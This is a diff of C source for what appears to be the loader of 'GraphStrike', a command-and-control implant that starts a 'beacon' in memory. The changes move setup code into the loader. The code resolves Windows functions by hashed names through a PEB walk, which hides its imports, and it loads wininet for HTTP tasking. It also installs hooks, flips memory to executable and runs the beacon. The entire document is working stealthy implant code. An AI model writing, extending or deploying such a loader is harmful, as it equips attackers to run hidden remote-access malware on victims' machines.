@@ -63,10 +63,11 @@ typedef struct
 SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
 {
     PPEB    Peb;
-    HANDLE  hNtdll;
+    HANDLE  hNtdll, hCrt;
 
     Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
     hNtdll = FindModule( H_LIB_NTDLL, Peb, NULL );
+    hCrt    = FindModule( H_LIB_MSVCRT, Peb, NULL );
 
     if( !hNtdll )
     {
@@ -76,10 +77,19 @@ SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
     pApi->ntdll.NtAllocateVirtualMemory = FindFunction( hNtdll, H_API_NTALLOCATEVIRTUALMEMORY );
     pApi->ntdll.NtProtectVirtualMemory  = FindFunction( hNtdll, H_API_NTPROTECTVIRTUALMEMORY );
     pApi->ntdll.RtlCreateHeap           = FindFunction( hNtdll, H_API_RTLCREATEHEAP );
+    pApi->ntdll.LdrLoadDll              = FindFunction( hNtdll, H_API_LDRLOADDLL );
+    pApi->ntdll.RtlInitUnicodeString    = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );
+
+    pApi->msvcrt.malloc               = FindFunction( hCrt, H_API_MALLOC);
+    pApi->msvcrt.memset               = FindFunction( hCrt, H_API_MEMSET);
 
     if( !pApi->ntdll.NtAllocateVirtualMemory ||
         !pApi->ntdll.NtProtectVirtualMemory  ||
-        !pApi->ntdll.RtlCreateHeap            )
+        !pApi->ntdll.LdrLoadDll              ||
+        !pApi->ntdll.RtlInitUnicodeString    ||            
+        !pApi->ntdll.RtlCreateHeap           ||
+        !pApi->msvcrt.malloc                 ||
+        !pApi->msvcrt.memset                  )        
     {
         return -1;
     };
@@ -174,6 +184,107 @@ SECTION( B ) VOID executeBeacon( PVOID entry )
     Ent( ( HMODULE )OFFSET( Start ), 4, NULL );
 };
 
+SECTION( B ) NTSTATUS resolveGraphStrikeFunctions( PAPI pApi, struct MemAddrs* pMemAddrs )
+{
+    PPEB                Peb;
+    HANDLE              hK32;
+    HANDLE              hCrt;
+    UNICODE_STRING      Uni;
+
+    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
+    pMemAddrs->Api.ntdll.hNtdll = FindModule( H_LIB_NTDLL, Peb, &pMemAddrs->Api.ntdll.size );
+    pMemAddrs->Api.net.hNet = FindModule( H_LIB_WININET, Peb, &pMemAddrs->Api.net.size );    
+    hK32 = FindModule( H_LIB_KERNEL32, Peb, NULL );
+    hCrt = FindModule( H_LIB_MSVCRT, Peb, NULL );
+
+    if( !pMemAddrs->Api.ntdll.hNtdll || !hK32 )
+    {
+        return -1;
+    };
+
+    // Ntdll
+    pMemAddrs->Api.ntdll.RtlAllocateHeap           = FindFunction( pMemAddrs->Api.ntdll.hNtdll, H_API_RTLALLOCATEHEAP );
+    pMemAddrs->Api.ntdll.NtWaitForSingleObject     = FindFunction( pMemAddrs->Api.ntdll.hNtdll, H_API_NTWAITFORSINGLEOBJECT );
+
+    // Kernel32
+    pMemAddrs->Api.k32.QueryPerformanceCounter     = FindFunction( hK32, H_API_QUERYPERFORMANCECOUNTER);
+    pMemAddrs->Api.k32.QueryPerformanceFrequency   = FindFunction( hK32, H_API_QUERYPERFORMANCEFREQUENCY);
+    pMemAddrs->Api.k32.GetLastError                = FindFunction( hK32, H_API_GETLASTERROR);
+    pMemAddrs->Api.k32.SetLastError                = FindFunction( hK32, H_API_SETLASTERROR);
+    pMemAddrs->Api.k32.Sleep                       = FindFunction(hK32, H_API_SLEEP);
+
+    // Wininet
+    if( !pMemAddrs->Api.net.hNet )
+    {
+        pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"wininet.dll" ) ) );
+        pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &pMemAddrs->Api.net.hNet );
+        if ( !pMemAddrs->Api.net.hNet )
+            return -1;
+        
+        // Now call FindModule again to populate pMemAddrs with the size of the module
+        pMemAddrs->Api.net.hNet = FindModule( H_LIB_WININET, Peb, &pMemAddrs->Api.net.size );   
+    }
+
+    pMemAddrs->Api.net.InternetConnectA             = FindFunction(pMemAddrs->Api.net.hNet, H_API_INTERNETCONNECTA);
+    pMemAddrs->Api.net.HttpOpenRequestA             = FindFunction(pMemAddrs->Api.net.hNet, H_API_HTTPOPENREQUESTA);
+    pMemAddrs->Api.net.HttpSendRequestA             = FindFunction(pMemAddrs->Api.net.hNet, H_API_HTTPSENDREQUESTA);
+    pMemAddrs->Api.net.InternetReadFile             = FindFunction(pMemAddrs->Api.net.hNet, H_API_INTERNETREADFILE);
+    pMemAddrs->Api.net.InternetCloseHandle          = FindFunction(pMemAddrs->Api.net.hNet, H_API_INTERNETCLOSEHANDLE);
+
+    #ifdef DEBUG
+        // User32
+        HANDLE hU32 = FindModule( H_LIB_USER32, Peb, NULL );
+        if( !hU32 )
+        {
+            RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
+            pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"user32.dll" ) ) );
+            pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &hU32 );
+            if ( !hU32 )
+                return -1;
+        };
+
+        pMemAddrs->Api.user32.MessageBoxA              = FindFunction( hU32, H_API_MESSAGEBOXA);            
+    #endif
+
+    pMemAddrs->Api.msvcrt.strlen                   = FindFunction( hCrt, H_API_STRLEN);
+    pMemAddrs->Api.msvcrt.malloc                   = FindFunction( hCrt, H_API_MALLOC);
+    pMemAddrs->Api.msvcrt.calloc                   = FindFunction( hCrt, H_API_CALLOC);
+    pMemAddrs->Api.msvcrt.memset                   = FindFunction( hCrt, H_API_MEMSET);
+    pMemAddrs->Api.msvcrt.memcpy                   = FindFunction( hCrt, H_API_MEMCPY);
+    pMemAddrs->Api.msvcrt.strstr                   = FindFunction( hCrt, H_API_STRSTR);
+    pMemAddrs->Api.msvcrt.sprintf                  = FindFunction( hCrt, H_API_SPRINTF);
+    pMemAddrs->Api.msvcrt.free                     = FindFunction( hCrt, H_API_FREE);
+    pMemAddrs->Api.msvcrt.strcpy                   = FindFunction( hCrt, H_API_STRCPY);
+    pMemAddrs->Api.msvcrt.strcmp                   = FindFunction( hCrt, H_API_STRCMP);
+    pMemAddrs->Api.msvcrt.isdigit                  = FindFunction( hCrt, H_API_ISDIGIT);    
+    pMemAddrs->Api.msvcrt.tolower                  = FindFunction( hCrt, H_API_TOLOWER);  
+    
+    if( !pMemAddrs->Api.k32.QueryPerformanceCounter   ||
+        !pMemAddrs->Api.k32.QueryPerformanceFrequency ||
+        !pMemAddrs->Api.k32.Sleep                     ||
+        !pMemAddrs->Api.msvcrt.strlen                 ||
+        !pMemAddrs->Api.msvcrt.malloc                 ||
+        !pMemAddrs->Api.msvcrt.calloc                 ||
+        !pMemAddrs->Api.msvcrt.memset                 ||
+        !pMemAddrs->Api.msvcrt.memcpy                 ||
+        !pMemAddrs->Api.msvcrt.strstr                 ||
+        !pMemAddrs->Api.msvcrt.sprintf                ||
+        !pMemAddrs->Api.msvcrt.free                   ||
+        !pMemAddrs->Api.msvcrt.strcpy                 ||
+        !pMemAddrs->Api.msvcrt.strcmp                 ||
+        !pMemAddrs->Api.msvcrt.isdigit                ||
+        !pMemAddrs->Api.msvcrt.tolower                ||        
+        !pMemAddrs->Api.net.InternetConnectA          ||
+        !pMemAddrs->Api.net.HttpOpenRequestA          ||
+        !pMemAddrs->Api.net.HttpSendRequestA          ||
+        !pMemAddrs->Api.net.InternetReadFile           )
+    {
+        return -1;
+    };
+
+    return STATUS_SUCCESS;
+};
+
 SECTION( B ) VOID Loader( VOID ) 
 {
     API         Api;
@@ -199,6 +310,25 @@ SECTION( B ) VOID Loader( VOID )
             fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
             installHooks( Map, MemoryBuffer, Reg.NT );
 
+            // Create MemAddr struct to contain important values for GraphStrike
+            struct MemAddrs *pMemAddrs  = Api.msvcrt.malloc(sizeof(struct MemAddrs));
+            Api.msvcrt.memset(pMemAddrs, 0, sizeof(struct MemAddrs));
+            pMemAddrs->graphStrike = (BOOL) U_PTR ( NULL );
+            pMemAddrs->firstGet = TRUE;
+            pMemAddrs->firstPost = TRUE;
+            pMemAddrs->readTasking = FALSE;        
+            pMemAddrs->lastTokenTime = 0;
+
+            // Resolve GraphStrike functions for later use
+            resolveGraphStrikeFunctions(&Api, pMemAddrs);
+            
+            // Store pointer to pMemAddrs for later reference
+            // We want to write AFTER Stub, which means 24 bytes (sizeof STUB) after MemoryBuffer. 
+            // Sizeof(PMEMADDR) is 8, so add 3 which is really 3x8 = 24.
+            PMEMADDR MemAddr = ( PMEMADDR )MemoryBuffer + 3; 
+            MemAddr->address = (PVOID*)&pMemAddrs;
+
+            // Now that we are done writing, we can toggle memory protections to RX
             Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
             Status = Api.ntdll.NtProtectVirtualMemory( ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
             if( Status == STATUS_SUCCESS )
@@ -270,121 +400,6 @@ SECTION( B ) NTSTATUS createBeaconThread( PAPI pApi, PHANDLE thread )
     return pApi->ntdll.RtlCreateUserThread( ( HANDLE )-1, NULL, Suspended, 0, 0, 0, ( PUSER_THREAD_START_ROUTINE )StartAddress, NULL, thread, NULL );
 };
 
-SECTION( B ) NTSTATUS resolveGraphStrikeFunctions( PAPI pApi, struct MemAddrs* pMemAddrs )
-{
-    PPEB                Peb;
-    HANDLE              hK32;
-    HANDLE              hCrt;
-    UNICODE_STRING      Uni;
-
-    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
-    pMemAddrs->Api.ntdll.hNtdll = FindModule( H_LIB_NTDLL, Peb, &pMemAddrs->Api.ntdll.size );
-    pMemAddrs->Api.net.hNet = FindModule( H_LIB_WININET, Peb, &pMemAddrs->Api.net.size );    
-    hK32 = FindModule( H_LIB_KERNEL32, Peb, NULL );
-    hCrt = FindModule( H_LIB_MSVCRT, Peb, NULL );
-
-    if( !pMemAddrs->Api.ntdll.hNtdll || !hK32 )
-    {
-        return -1;
-    };
-
-    // Ntdll
-    pMemAddrs->Api.ntdll.RtlAllocateHeap           = FindFunction( pMemAddrs->Api.ntdll.hNtdll, H_API_RTLALLOCATEHEAP );
-    pMemAddrs->Api.ntdll.NtWaitForSingleObject     = FindFunction( pMemAddrs->Api.ntdll.hNtdll, H_API_NTWAITFORSINGLEOBJECT );
-
-    // Kernel32
-    pMemAddrs->Api.k32.QueryPerformanceCounter     = FindFunction( hK32, H_API_QUERYPERFORMANCECOUNTER);
-    pMemAddrs->Api.k32.QueryPerformanceFrequency   = FindFunction( hK32, H_API_QUERYPERFORMANCEFREQUENCY);
-    pMemAddrs->Api.k32.GetLastError                = FindFunction( hK32, H_API_GETLASTERROR);
-    pMemAddrs->Api.k32.SetLastError                = FindFunction( hK32, H_API_SETLASTERROR);
-    pMemAddrs->Api.k32.Sleep                       = FindFunction(hK32, H_API_SLEEP);
-
-    // Wininet
-    if( !pMemAddrs->Api.net.hNet )
-    {
-        pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"wininet.dll" ) ) );
-        pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &pMemAddrs->Api.net.hNet );
-        if ( !pMemAddrs->Api.net.hNet )
-            return -1;
-        
-        // Now call FindModule again to populate pMemAddrs with the size of the module
-        pMemAddrs->Api.net.hNet = FindModule( H_LIB_WININET, Peb, &pMemAddrs->Api.net.size );   
-    }
-
-    pMemAddrs->Api.net.InternetConnectA             = FindFunction(pMemAddrs->Api.net.hNet, H_API_INTERNETCONNECTA);
-    pMemAddrs->Api.net.HttpOpenRequestA             = FindFunction(pMemAddrs->Api.net.hNet, H_API_HTTPOPENREQUESTA);
-    pMemAddrs->Api.net.HttpSendRequestA             = FindFunction(pMemAddrs->Api.net.hNet, H_API_HTTPSENDREQUESTA);
-    pMemAddrs->Api.net.InternetReadFile             = FindFunction(pMemAddrs->Api.net.hNet, H_API_INTERNETREADFILE);
-    pMemAddrs->Api.net.InternetCloseHandle          = FindFunction(pMemAddrs->Api.net.hNet, H_API_INTERNETCLOSEHANDLE);
-
-    #ifdef DEBUG
-        // User32
-        HANDLE hU32 = FindModule( H_LIB_USER32, Peb, NULL );
-        if( !hU32 )
-        {
-            RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
-            pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"user32.dll" ) ) );
-            pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &hU32 );
-            if ( !hU32 )
-                return -1;
-        };
-
-        pMemAddrs->Api.user32.MessageBoxA              = FindFunction( hU32, H_API_MESSAGEBOXA);            
-    #endif
-
-    // Msvcrt
-    if( !hCrt )
-    {
-        RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
-        pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"msvcrt.dll" ) ) );
-        pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &hCrt );
-        if ( !hCrt )
-        {
-            return -1;
-        }
-    };
-
-    pMemAddrs->Api.msvcrt.strlen                   = FindFunction( hCrt, H_API_STRLEN);
-    pMemAddrs->Api.msvcrt.malloc                   = FindFunction( hCrt, H_API_MALLOC);
-    pMemAddrs->Api.msvcrt.calloc                   = FindFunction( hCrt, H_API_CALLOC);
-    pMemAddrs->Api.msvcrt.memset                   = FindFunction( hCrt, H_API_MEMSET);
-    pMemAddrs->Api.msvcrt.memcpy                   = FindFunction( hCrt, H_API_MEMCPY);
-    pMemAddrs->Api.msvcrt.strstr                   = FindFunction( hCrt, H_API_STRSTR);
-    pMemAddrs->Api.msvcrt.sprintf                  = FindFunction( hCrt, H_API_SPRINTF);
-    pMemAddrs->Api.msvcrt.free                     = FindFunction( hCrt, H_API_FREE);
-    pMemAddrs->Api.msvcrt.strcpy                   = FindFunction( hCrt, H_API_STRCPY);
-    pMemAddrs->Api.msvcrt.strcmp                   = FindFunction( hCrt, H_API_STRCMP);
-    pMemAddrs->Api.msvcrt.isdigit                  = FindFunction( hCrt, H_API_ISDIGIT);    
-    pMemAddrs->Api.msvcrt.tolower                  = FindFunction( hCrt, H_API_TOLOWER);
-
-    //RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
-
-    if( !pMemAddrs->Api.k32.QueryPerformanceCounter   ||
-        !pMemAddrs->Api.k32.QueryPerformanceFrequency ||
-        !pMemAddrs->Api.k32.Sleep                     ||
-        !pMemAddrs->Api.msvcrt.strlen                 ||
-        !pMemAddrs->Api.msvcrt.malloc                 ||
-        !pMemAddrs->Api.msvcrt.calloc                 ||
-        !pMemAddrs->Api.msvcrt.memset                 ||
-        !pMemAddrs->Api.msvcrt.memcpy                 ||
-        !pMemAddrs->Api.msvcrt.strstr                 ||
-        !pMemAddrs->Api.msvcrt.sprintf                ||
-        !pMemAddrs->Api.msvcrt.free                   ||
-        !pMemAddrs->Api.msvcrt.strcpy                 ||
-        !pMemAddrs->Api.msvcrt.strcmp                 ||
-        !pMemAddrs->Api.msvcrt.isdigit                ||
-        !pMemAddrs->Api.msvcrt.tolower                ||
-        !pMemAddrs->Api.net.InternetConnectA          ||
-        !pMemAddrs->Api.net.HttpOpenRequestA          ||
-        !pMemAddrs->Api.net.HttpSendRequestA          ||
-        !pMemAddrs->Api.net.InternetReadFile           )
-    {
-        return -1;
-    };
-
-    return STATUS_SUCCESS;
-};
-
 SECTION( B ) VOID GraphStrike( VOID )
 {
     API         Api;
@@ -396,21 +411,6 @@ SECTION( B ) VOID GraphStrike( VOID )
 
     if( resolveAPIs( &Api ) == STATUS_SUCCESS )
     {
-        // Create MemAddr struct to contain important values for GraphStrike
-        struct MemAddrs *pMemAddrs  = Api.msvcrt.malloc(sizeof(struct MemAddrs));
-        Api.msvcrt.memset(pMemAddrs, 0, sizeof(struct MemAddrs));
-        pMemAddrs->graphStrike = (BOOL) U_PTR ( NULL );
-        pMemAddrs->firstGet = TRUE;
-        pMemAddrs->firstPost = TRUE;
-        pMemAddrs->readTasking = FALSE;        
-        pMemAddrs->lastTokenTime = 0;
-
-        // Resolve GraphStrike functions for later use
-        resolveGraphStrikeFunctions(&Api, pMemAddrs);
-
-        // Store pointer to pMemAddrs for later reference
-        ((PMEMADDR)MemAddr)->address = (PVOID*)&pMemAddrs;    
-
         if( NT_SUCCESS( createBeaconThread( &Api, &Thread ) ) )
         {
             Ctx.ContextFlags = CONTEXT_CONTROL;
